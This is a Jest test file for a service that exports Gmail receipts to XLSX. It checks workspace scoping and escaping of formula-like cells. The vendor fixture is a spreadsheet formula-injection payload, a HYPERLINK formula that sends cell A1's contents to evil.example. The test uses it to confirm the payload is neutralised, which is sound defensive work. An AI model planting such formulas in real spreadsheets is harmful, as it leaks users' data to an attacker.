import * as xlsx from 'xlsx';
import { GmailReceiptExportService } from '@/modules/gmail/services/gmail-receipt-export.service';

describe('GmailReceiptExportService.exportToXlsx', () => {
  const vendor = '=HYPERLINK("http://evil.example/?"&A1,"x")';

  function build() {
    const receiptRepository = {
      find: jest.fn().mockResolvedValue([
        {
          id: 'r1',
          workspaceId: 'ws-1',
          sender: 'shop@example.com',
          gmailMessageId: 'm1',
          status: 'parsed',
          receivedAt: new Date('2026-10-01T00:00:00Z'),
          parsedData: { date: '2026-10-01', vendor, amount: 12, currency: 'EUR', category: '+x' },
        },
      ]),
    };
    const service = new GmailReceiptExportService(
      receiptRepository as never,
      {} as never,
      {} as never,
    );
    return { service, receiptRepository };
  }

  it('returns the workbook in memory, scoped to the workspace', async () => {
    const { service, receiptRepository } = build();

    const result = await service.exportToXlsx('ws-1', ['r1']);

    expect(receiptRepository.find).toHaveBeenCalledWith(
      expect.objectContaining({ where: expect.objectContaining({ workspaceId: 'ws-1' }) }),
    );
    expect(result.fileName).toMatch(/^receipts-\d+\.xlsx$/);
    expect(Buffer.isBuffer(result.buffer)).toBe(true);
    expect(result).not.toHaveProperty('url');
  });

  it('neutralises formula-looking merchant and category cells', async () => {
    const { service } = build();

    const { buffer } = await service.exportToXlsx('ws-1', ['r1']);
    const sheet = xlsx.read(buffer, { type: 'buffer' }).Sheets.Receipts;

    expect(sheet.B2.v).toBe(`'${vendor}`);
    expect(sheet.B2.f).toBeUndefined();
    expect(sheet.G2.v).toBe("'+x");
    // Numbers stay numbers.
    expect(sheet.C2.v).toBe(12);
  });
});
